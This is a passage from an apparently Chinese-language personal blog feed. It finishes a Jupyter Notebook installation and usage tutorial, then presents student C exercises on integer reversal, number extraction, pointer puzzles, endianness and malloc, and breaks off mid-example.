<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure>

<p>然后浏览器就会自动打开 Notebook 窗口。<br>但是此时你所创建的 notebook 文件都是放置在<code>你的Python安装目录\Script</code>下。之后会提到如何修改 Jupyter Notebook 的工作空间。</p>
<h2 id="通过-Anaconda-安装"><a href="#通过-Anaconda-安装" class="headerlink" title="通过 Anaconda 安装"></a>通过 Anaconda 安装</h2><p>在安装<code>Anaconda</code>的同时会安装 Python 和 Jupyter Notebooks 这两个工具，并且还包含相当多数据科学和机器学习社区常用的软件包。<br>关于 Anaconda 的安装与使用，可以参考这个链接：<a href="https://www.jianshu.com/p/62f155eb6ac5" target="_blank" rel="noopener">Anaconda 介绍、安装及使用教程</a><br>安装好了 Anaconda 后，可以直接在 Anaconda 的命令提示符界面输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure>

<p>然后就可以食用 Jupyter 了</p>
<h1 id="修改-Jupyter-Notebook-工作空间"><a href="#修改-Jupyter-Notebook-工作空间" class="headerlink" title="修改 Jupyter Notebook 工作空间"></a>修改 Jupyter Notebook 工作空间</h1><p>在我们第一次启动 Notebooks 时，默认显示的是 Script 文件夹下的文件目录。因为此时 notebooks 默认的工作空间是安装目录。<br>但是这样的话找起文件来比较麻烦。我们可以自己定义一个专属的工作空间</p>
<h2 id="获取-Jupyter-Notebook-的配置文件"><a href="#获取-Jupyter-Notebook-的配置文件" class="headerlink" title="获取 Jupyter Notebook 的配置文件"></a>获取 Jupyter Notebook 的配置文件</h2><p>打开命令提示窗口，执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jupyter notebook --generate-config</span><br></pre></td></tr></table></figure>

<p>此处需要注意的是，如果你已经配置过 notebooks 的相关信息，执行此命令会提示你是否覆盖原有配置。输入 y 直接覆盖。如果是首次执行此命令，则生成配置到相应目录。</p>
<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>打开生成的配置文件，修改<code>#c.NotebookApp.notebook_dir = &#39;&#39;</code>此条配置，在单引号中填入我们刚才创建的专属工作空间，此处我这里是 E:\MyTools\Python\jupyter-notebook。<br>要注意的是，由于转义字符这种神奇的存在。所以你需要在字符串的单引号前加 r，或者将单斜杠变为双斜杠，如下图所示。<br>此条配置默认是注释掉的，所以我们需要删除第一个#。ok,保存配置文件。<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E9%85%8D%E7%BD%AEJupyter.png" alt="配置Jupyter.png"><br>好了，现在打开命令提示窗口，执行<code>jupyter notebook</code>命令重新启动 Notebook，浏览器相应会打开 Notebook 主页，主页中相应会显示工作空间中的文件目录。<br><strong><em>注意：启动 notebook 之后，不要关闭该命令提示窗口。一旦关闭该窗口 Jupyter 的本地服务器就会被关闭。</em></strong></p>
<h1 id="Jupyter-Notebook-基本使用"><a href="#Jupyter-Notebook-基本使用" class="headerlink" title="Jupyter Notebook 基本使用"></a>Jupyter Notebook 基本使用</h1><h2 id="Jupyter-界面"><a href="#Jupyter-界面" class="headerlink" title="Jupyter 界面"></a>Jupyter 界面</h2><p>起订 Notebook 后，界面应该是这样的：<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Jupyter%E7%95%8C%E9%9D%A2.png" alt="Jupyter界面"></p>
<h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><ul>
<li><code>Files</code>：列出所有文件</li>
<li><code>Running</code>：展示你当前打开的终端和笔记本</li>
<li><code>Clusters</code>：由 IPython 并行提供的</li>
</ul>
<h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>点击右侧的 New 按钮可展开如图的下拉列表按钮，其内包括了可创建的四种工作环境：</p>
<ul>
<li><code>Python3</code>：创建一个可以执行 Python 代码的 ipynb 文件</li>
<li><code>Text File</code>：创建文本类型的 txt 文件</li>
<li><code>Folder</code>：创建一个文件夹</li>
<li><code>Teminal</code>：在浏览器中打开一个命令窗口</li>
</ul>
<h3 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h3><p>这里的按钮其实就是对当前工作空间内的文件进行一系列操作：</p>
<ul>
<li><code>Duplicate</code>：复制文件</li>
<li><code>Rename</code>：重命名</li>
<li><code>Move</code>：移动文件</li>
<li><code>Download</code>：下载文件</li>
<li><code>View</code>：在浏览器中预览文件内容</li>
<li><code>Edit</code>：编辑文件</li>
<li><code>Delete</code>(小图标)：删除选中的文件</li>
</ul>
<h2 id="Jupyter-Notebook-中编写并执行-Python-代码"><a href="#Jupyter-Notebook-中编写并执行-Python-代码" class="headerlink" title="Jupyter Notebook 中编写并执行 Python 代码"></a>Jupyter Notebook 中编写并执行 Python 代码</h2><p>在首页右侧点击<code>New</code>，选择点击<code>Python3,</code>页面即跳转到一个新的窗口，此时已经创建了一个新的文件，红色区域为该文件的名称(默认为 Untitled)，点击即可修改文件名，此处我们命名为 Hello_World，如下图所示。<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Jupyter_Demo1.png" alt="Jupyter_Demo1"><br>在<code>In [ ] :</code>后面的输入框中我们可以输入一段 python 代码进行测试，点击<code>Run</code>按钮执行,也可以快捷键<code>Ctrl+Enter</code>执行代码，结果如下:<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Jupyter_Demo2.png" alt="Jupyter_Demo2"><br>Jupyter Notebooks 的强大之处在于除了能够输入代码之外，你还可以用 Markdown 添加叙述性和解释性文本。比如我想添加一个文字说明，在代码上面添加了一个单元格，并以 Markdown 输入了一个文本。<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Jupyter_Demo3.png" alt="Jupyter_Demo3"><br>按下<code>Ctrl+Enter</code>，效果如下:<br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Jupyter_Demo4.png" alt="Jupyter_Demo4"></p>
<h2 id="Jupyter-Notebook-中的快捷键介绍"><a href="#Jupyter-Notebook-中的快捷键介绍" class="headerlink" title="Jupyter Notebook 中的快捷键介绍"></a>Jupyter Notebook 中的快捷键介绍</h2><p>当你熟练使用 notebooks 的基本功能后，掌握他的快捷键是十分必要的，这样可以大大提高你的工作效率。下面是一些比较常用的快捷键：</p>
<p>编辑模式：点击单元格按下<code>Enter</code><br>命令模式（退出编辑模式)：按下<code>Esc</code></p>
<p>进入命令模式之后（此时你没有活跃单元），有以下快捷键：</p>
<ul>
<li><code>A</code>：在所选单元之上插入一个新的单元</li>
<li><code>B</code>：在所选单元之下插入一个新的单元</li>
<li><code>D</code>：连续按两次删除所选的单元</li>
<li><code>Z</code>：撤销被删除的单元</li>
<li><code>Y</code>：将当前选中的单元变成一个代码单元</li>
<li><code>F</code>：查找和替换</li>
<li><code>Shift +上或下箭头</code>：可选择多个单元。</li>
<li><code>Shift + M</code>：在多选模式时，可合并你的选择。</li>
</ul>
<p>处于编辑模式时（在命令模式时按 Enter 会进入编辑模式），下列快捷键很有用：</p>
<ul>
<li><code>Ctrl + Home</code>：到达单元起始位置</li>
<li><code>Ctrl + S</code>：保存进度</li>
<li><code>Ctrl + Enter</code>：会运行你的整个单元块</li>
<li><code>Alt + Enter</code>：不止会运行你的单元块，还会在下面添加一个新单元</li>
<li><code>Ctrl + Shift + F</code>：打开命令面板<br>可在命令模式按 H 或进入 Help &gt; Keyboard Shortcuts。可以查看键盘快捷键完整列表。</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>关于 Jupyter Notebooks 的安装和基本用法就先介绍到这里就差不多了。</p>
]]></content>
      <tags>
        <tag>Jupyter</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>AST-Task2</title>
    <url>/2019/10/16/AST-Task2/</url>
    <content><![CDATA[<p>《C语言快速入门：从指针到Segmentation Fault》</p>
<a id="more"></a>

<p><strong>注意，本文编译环境为 Visual Studio 2019 on Windows 10 1903 X64</strong></p>
<h1 id="几个练手题"><a href="#几个练手题" class="headerlink" title="几个练手题"></a>几个练手题</h1><h2 id="1-编程实现：用户给定一个整数，将该整数逆置之后输出。（如：输入-123，输出-321）。"><a href="#1-编程实现：用户给定一个整数，将该整数逆置之后输出。（如：输入-123，输出-321）。" class="headerlink" title="1.编程实现：用户给定一个整数，将该整数逆置之后输出。（如：输入 123，输出 321）。"></a>1.编程实现：用户给定一个整数，将该整数逆置之后输出。（如：输入 123，输出 321）。</h2><h3 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h3><p>a.给定整数，不要用字符串来完成。<br>b.尽可能使时间复杂度小。<br>c.要求能够完成 214748364792 这个数字的逆置。</p>
<h3 id="程序源码"><a href="#程序源码" class="headerlink" title="程序源码"></a>程序源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> input;</span><br><span class="line">	scanf_s(<span class="string">"%lld"</span>, &amp;input);</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> output = <span class="number">0</span>, digit;</span><br><span class="line">	<span class="keyword">while</span> (input &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		digit = input % <span class="number">10</span>;<span class="comment">//取当前最末位数</span></span><br><span class="line">		output = output * <span class="number">10</span> + digit;<span class="comment">//将当前的最末位数加到待输出结果的最后一位</span></span><br><span class="line">		input /= <span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%lld"</span>, output);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E6%95%B4%E6%95%B0%E9%80%86%E7%BD%AE.png" alt="整数逆置"></p>
<h2 id="2-编程实现：给定一串任意字符串。要求，将其中的所有整数提取出来并存入整数数组"><a href="#2-编程实现：给定一串任意字符串。要求，将其中的所有整数提取出来并存入整数数组" class="headerlink" title="2.编程实现：给定一串任意字符串。要求，将其中的所有整数提取出来并存入整数数组"></a>2.编程实现：给定一串任意字符串。要求，将其中的所有整数提取出来并存入整数数组</h2><h3 id="给定样例"><a href="#给定样例" class="headerlink" title="给定样例"></a>给定样例</h3><p>1023fase415#145#</p>
<h3 id="程序源码-1"><a href="#程序源码-1" class="headerlink" title="程序源码"></a>程序源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">1000</span>];</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">int</span> p, q;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>, r = <span class="number">0</span>,count = <span class="number">0</span>;<span class="comment">//i用于控制输出，r用于控制字符串内查找,count用于计算字符串内数字个数</span></span><br><span class="line"></span><br><span class="line">	gets(str);</span><br><span class="line"></span><br><span class="line">	r = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span> (str[r] &amp;&amp; (str[r]&lt;<span class="string">'0'</span> || str[r]&gt;<span class="string">'9'</span>))</span><br><span class="line">			r++;        <span class="comment">//跳过字符串中非数字部分</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (str[r])</span><br><span class="line">		&#123;</span><br><span class="line">			p = r;      <span class="comment">//p指向数字子串开头</span></span><br><span class="line">			q = r + <span class="number">1</span>;  <span class="comment">//q寻找数字串结尾</span></span><br><span class="line">			a[i] = str[r] - <span class="string">'0'</span>;<span class="comment">//将字符串中的0变为数字0</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span> (str[q] &gt;= <span class="string">'0'</span> &amp;&amp; str[q] &lt;= <span class="string">'9'</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				a[i] = <span class="number">10</span> * a[i] + (str[q] - <span class="string">'0'</span>);<span class="comment">//计算数字</span></span><br><span class="line">				q++;</span><br><span class="line">			&#125;</span><br><span class="line">			count++;</span><br><span class="line">			r = q;    <span class="comment">//设定新起点</span></span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d "</span>, a[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E6%8F%90%E5%8F%96%E6%95%B4%E6%95%B0.png" alt="提取整数"></p>
<h2 id="3-编程实现：给定一串任意字符串。要求，将其中的所有数字提取出来并存入-double-数组。"><a href="#3-编程实现：给定一串任意字符串。要求，将其中的所有数字提取出来并存入-double-数组。" class="headerlink" title="3.编程实现：给定一串任意字符串。要求，将其中的所有数字提取出来并存入 double 数组。"></a>3.编程实现：给定一串任意字符串。要求，将其中的所有数字提取出来并存入 double 数组。</h2><h3 id="给定样例-1"><a href="#给定样例-1" class="headerlink" title="给定样例"></a>给定样例</h3><p>10.23fase4.15#14.5#</p>
<h3 id="程序源码-2"><a href="#程序源码-2" class="headerlink" title="程序源码"></a>程序源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">1000</span>], num[<span class="number">1000</span>];</span><br><span class="line">	<span class="keyword">double</span> a[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">int</span> p, q;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>, r = <span class="number">0</span>,count = <span class="number">0</span>;<span class="comment">//i用于控制循环，r用于控制字符串内查找,count用于计算字符串内数字个数</span></span><br><span class="line"></span><br><span class="line">	gets(str);</span><br><span class="line"></span><br><span class="line">	r = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span> (str[r] &amp;&amp; (str[r]&lt;<span class="string">'0'</span> || str[r]&gt;<span class="string">'9'</span>)) &#123;<span class="comment">//查找数字字串开头部分</span></span><br><span class="line">			r++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (str[r])</span><br><span class="line">		&#123;</span><br><span class="line">			p = r;      <span class="comment">//p指向数字子串开头</span></span><br><span class="line">			q = r + <span class="number">1</span>;  <span class="comment">//q寻找数字串结尾</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span> ((str[q] &gt;= <span class="string">'0'</span> &amp;&amp; str[q] &lt;= <span class="string">'9'</span>)||str[q]==<span class="string">'.'</span>)&#123;</span><br><span class="line">				q++;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; q-p; i++) &#123;<span class="comment">//将数字字串转存到新字符串中，用于后续转化输出</span></span><br><span class="line">				num[i] = str[p + i];</span><br><span class="line">			&#125;</span><br><span class="line">			num[i] = <span class="string">'\0'</span>;</span><br><span class="line">		a[count] = atof(num);</span><br><span class="line">			count++;</span><br><span class="line">			r = q;    <span class="comment">//设定新起点</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%lf "</span>, a[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="运行结果-2"><a href="#运行结果-2" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E6%8F%90%E5%8F%96%E6%95%B0%E5%AD%97.png" alt="提取数字"></p>
<h1 id="几个烧脑题"><a href="#几个烧脑题" class="headerlink" title="几个烧脑题"></a>几个烧脑题</h1><h2 id="多级指针：观察下列代码，思考并解释程序运行结果"><a href="#多级指针：观察下列代码，思考并解释程序运行结果" class="headerlink" title="多级指针：观察下列代码，思考并解释程序运行结果"></a>多级指针：观察下列代码，思考并解释程序运行结果</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><h4 id="程序代码及解释"><a href="#程序代码及解释" class="headerlink" title="程序代码及解释"></a>程序代码及解释</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * c[] = &#123; <span class="string">"ENTER"</span>, <span class="string">"NEW"</span>, <span class="string">"POINT"</span>, <span class="string">"FIRST"</span> &#125;;<span class="comment">//定义了四个指针c[0]-c[3]分别指向四个字符串</span></span><br><span class="line">	<span class="keyword">char</span>** cp[] = &#123; c + <span class="number">3</span>, c + <span class="number">2</span>, c + <span class="number">1</span>, c &#125;;<span class="comment">//定义了一个二级指针数组，其中的cp[0]-cp[3]分别依次对应c[3]-c[0]</span></span><br><span class="line">	<span class="keyword">char</span>*** cpp = cp;<span class="comment">//定义了一个三级指针，指向二级指针数组的第一个元素cp[0]，此时cpp就相当于c[3]</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, ** ++cpp);<span class="comment">//** cpp经过间接引用运算后相当于是指针cp，指针cp自增后指向的是指针数组cp[]中的第二个元素,也即是c[2]</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, * --* ++cpp + <span class="number">3</span>);<span class="comment">//首先对指针cpp作了自增操作，使得cpp指向cp[2],此时cpp中的地址为c+1，再通过自减符使得指针 * cpp即cp[2] (注意不是cpp)的地址变为c，这时候*--* ++cpp相当于指向了一个字符数组&#123;'E','N','T','E','R'&#125;的首地址。+3的操作等价于在这个字符数组的首地址的基础上再右移三个地址，指向了第二个E，然后通过printf将第二个E和之后的所有剩余字符全部打印。</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, * cpp[<span class="number">-2</span>] + <span class="number">3</span>);<span class="comment">//经过了上一条语句后，cpp指向cp[2],那么cpp[-2]指向cp[0]（注意，此时cpp内存储的地址并没有改变）,即c[3]此时的*cpp[-2]就相当于指向了一个字符数组&#123;'F','I','R','S','T'&#125;的首地址。+3的操作等价于在这个字符数组的首地址的基础上再右移三个地址，指向了S，然后通过printf将S和之后的所有剩余字符全部打印。</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, * cpp[<span class="number">-1</span>][<span class="number">-1</span>] + <span class="number">1</span>);<span class="comment">//同上理，此时cpp指向cp[2],cpp[-1]就会指向cp[1]，即c[2],那么cpp[-1][-1]就相当于指向c[1],即一个字符数组&#123;'N','E','W'&#125;的首地址。+1的操作等价于在这个字符数组的首地址的基础上再右移1个地址，指向了E，然后通过printf将E和之后的所有剩余字符全部打印。</span></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="上机验证"><a href="#上机验证" class="headerlink" title="上机验证"></a>上机验证</h4><p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/20191019223002.png" alt="上机验证"></p>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><h4 id="程序代码"><a href="#程序代码" class="headerlink" title="程序代码"></a>程序代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> Num;</span><br><span class="line">	<span class="keyword">char</span>* pcName;</span><br><span class="line">	<span class="keyword">short</span> sDate;</span><br><span class="line">	<span class="keyword">char</span> cha[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">short</span> sBa[<span class="number">4</span>];</span><br><span class="line">&#125;*p;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	p = <span class="number">0x100000</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>, p + <span class="number">0x1</span>);<span class="comment">//输出00100014</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)p + <span class="number">0x1</span>);<span class="comment">//输出00100001</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)p + <span class="number">0x1</span>);<span class="comment">//输出00100004</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><p>首先要明确，指针与整数的加减法公式为 p = p +/- sizeof（type * p）</p>
<p>第一行输出 00100014 的原因是结构体 Test 的存储空间大小为 sizeof(int) + sizeof(char* ) + sizeof(short) + sizeof(char)* 2 + sizeof(short)* 4 = 20,并且指针的地址是以十六进制数存放的，因此 p + 0x1 就相当于指针 p 向后移动了 sizeof(Test)的内存大小，因此输出的内存地址比 1000000 大 20，为 00100014。</p>
<p>第二行输出 001000001 的原因是(unsigned long)语句将* p 转换成了整数类型，因此此时做的只是普通的整数与整数之间的加减法。</p>
<p>第三行输出 00100004 的原因是 (unsigned int<em>)语句将 Test</em> 类型的 p 指针转换成了 int _ 类型，根据公式此时 sizeof(int_) = 4,因此输出 00100004。</p>
<h4 id="上机验证-1"><a href="#上机验证-1" class="headerlink" title="上机验证"></a>上机验证</h4><p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E4%B8%8A%E6%9C%BA%E9%AA%8C%E8%AF%812.png" alt="上机验证"></p>
<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><h4 id="程序代码-1"><a href="#程序代码-1" class="headerlink" title="程序代码"></a>程序代码</h4><p>#include &lt;stdio.h&gt;</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">4</span>] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> * ptr1 = (<span class="keyword">int</span> * )(&amp;a + <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">int</span> * ptr2 = (<span class="keyword">int</span> * )((<span class="keyword">int</span>)a + <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%x\n%x\n"</span>, ptr1[<span class="number">-1</span>], * ptr2);\\输出<span class="number">4</span> <span class="number">2000000</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h4><p>首先，&amp;a 指的是取数组 a 的地址，而&amp;a + 1 指的是加上一个 int a[4]的长度，即 sizeof(int) * 4=16 字节，所以 ptr1 指向数组 a 后面的内存单元，如果用下标表示就是 a[5]</p>
<p>由指针与整数的加减法公式 p = p +/- sizeof（type _ p，ptr1[-1]表示 ptr1 指向的地址再减去 sizeof(int _ )，即指向 a[4]，所以第一个%x 输出对应的是 0x4.</p>
<p>(int)a+1 的值就是元素 a[0]的第二个字节的地址，然后把这个地址强制转化为（int<em>)类型赋给 ptr2，也就是说</em>ptr2 的值应该为元素 a[0]的第二个字节开始的连续 4 个 Byte 的内容。</p>
<p>不过要想理解为什么输出了 2000000，就要首先明白数字在数组中是怎么被存储的：</p>
<p>每个元素具体存储方式，取决于 CPU。 有两种：<br>1、小端(Little Endian)：<br>将低序字节存储在起始地址（低位编址）, 地址低位存储值的低位，地址高位存储值的高位 。<br>目前大多数 CPU 是按照这种方式存储的，包括 intel 和移动端最常见的 arm。<br>比如 4 字节整型值为 0x12345678 的情况，那么在内存中会存储为：<br>0x78 0x56 0x34 0x12<br>2、大端(Big Endian)：<br>与小端相反， 将高序字节存储在起始地址（高位编址），地址低位存储值的高位,地址高位存储值的低位。<br>之前的例子在大端情况下存储为：<br>0x12 0x34 0x56 0x78</p>
<p>因此，a[0]在内存中被存储为 0x01 0x00 0x00 0x00,a[1]在内存中被存储为 0x02 0x00 0x00 0x00，此时 ptr2 所指向的内存区域的值就是 0x00 0x00 0x00 0x02</p>
<p>但是，在 printf 进行输出时，内存中的值是自右而左地被读出的，因此输出的值应该是 0x02000000</p>
<h4 id="上机验证-2"><a href="#上机验证-2" class="headerlink" title="上机验证"></a>上机验证</h4><p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/%E4%B8%8A%E6%9C%BA%E9%AA%8C%E8%AF%813.png" alt="上机验证"></p>
<h1 id="其余部分"><a href="#其余部分" class="headerlink" title="其余部分"></a>其余部分</h1><p><del>就先咕为敬了，告辞</del><br><del>有空再补</del><br><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/1571031606850.gif" alt="咕咕咕"><br>好了我胡汉三又回来了</p>
<h2 id="malloc-函数的使用"><a href="#malloc-函数的使用" class="headerlink" title="malloc 函数的使用"></a>malloc 函数的使用</h2><p>在 C 语言中，malloc 是动态内存分配函数。</p>
<p>它的原型声明在 stdlib.h 头文件中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_bytes)</span></span>;</span><br></pre></td></tr></table></figure>

<p>num_bytes 是无符号整型，用于表示分配的字节数。<br>这个函数的返回值：如果分配成功则返回指向被分配内存的指针 void* (此存储区中的初始值不确定)，否则返回空指针 NULL。<br>void* 表示未确定类型的指针，void * 可以指向任何类型的数据，更明确的说是指申请内存空间时还不知道用户是用这段空间来存储什么类型的数据（比如是 char 还是 int 或者…）<br>这个函数的功能很简单：就是分配长度为 num_bytes 字节的内存块。<br>注意：由于 C 语言中缺少内存回收机制，所以当内存不再使用时，应使用 free()函数将内存块释放。函数返回的指针一定要适当对齐，例如说统一为 4 的倍数，使其可以用于任何数据对象。<br>关于该函数的原型，在以前 malloc 返回的是 char 型指针，新的 ANSIC 标准规定，该函数返回为 void 型指针，因此在使用是我们应要进行类型转换。<br>example:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;//malloc()函数被包含在stdlib.h里面</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>*a=<span class="literal">NULL</span>; <span class="comment">//声明一个指向a的char*类型的指针</span></span><br><span class="line"></span><br><span class="line">a=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">100</span>*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));<span class="comment">//使用malloc分配内存的首地址，然后赋值给a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!a)<span class="comment">//如果malloc失败，可以得到一些log</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span 